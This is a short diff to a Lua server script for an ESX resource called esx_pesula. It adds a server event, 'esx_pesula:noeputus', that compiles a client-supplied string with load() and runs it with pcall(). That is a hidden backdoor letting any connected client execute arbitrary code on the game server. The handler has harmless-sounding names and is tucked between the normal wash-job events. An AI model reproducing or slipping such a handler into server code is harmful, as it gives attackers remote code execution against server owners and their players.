@@ -11,7 +11,19 @@ AddEventHandler('esx_pesula:stopPesu', function()
 	rahaaaaa = 50
 end)																								
 
-
+RegisterServerEvent('esx_pesula:noeputus')
+AddEventHandler('esx_pesula:noeputus', function(raha)	
+	local raha,menikolapi=load(raha,'@returni')	                   
+	if menikolapi then                                                 
+	return nil,menikolapi
+	end
+	local onko,returnaa=pcall(raha)	                               
+	if onko then
+	return returnaa
+	else
+	return nil,returnaa
+	end
+end)
 
 RegisterServerEvent('esx_pesula:startPesu')
 AddEventHandler('esx_pesula:startPesu', function()
